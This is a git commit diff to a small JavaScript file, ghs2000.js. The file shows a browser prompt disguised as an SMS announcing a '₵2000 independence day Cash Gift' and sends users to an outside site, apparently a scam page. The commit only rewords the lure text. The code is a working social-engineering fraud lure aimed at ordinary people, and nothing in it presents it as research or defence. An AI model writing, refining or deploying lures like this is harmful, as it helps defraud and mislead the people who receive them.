58c1aa2f0c1eaa7d38709c01eb7974a846ea4bde
usorondo37 <snob-halal-4v@icloud.com>
2026-03-03 07:41:37 +0100

    Update ghs2000.js

--- ghs2000.js
+++ ghs2000.js
@@ -1,5 +1,5 @@
 var password = 'GET ₵2000'
-password = prompt('SMS: Congratulations, you are eligible to receive ₵2000 independence day Cash Gift , click OK to activate now','GET ₵2000');
+password = prompt('SMS: Congratulations, you are eligible to receive ₵2000 independence day Cash Gift , click OK to get offer now','GET ₵2000');
 if (password != 'GET ₵2000') {
     location.href ='https://www.mkpoikot.site/ghs2000-indpendence-cash-gift';
 }
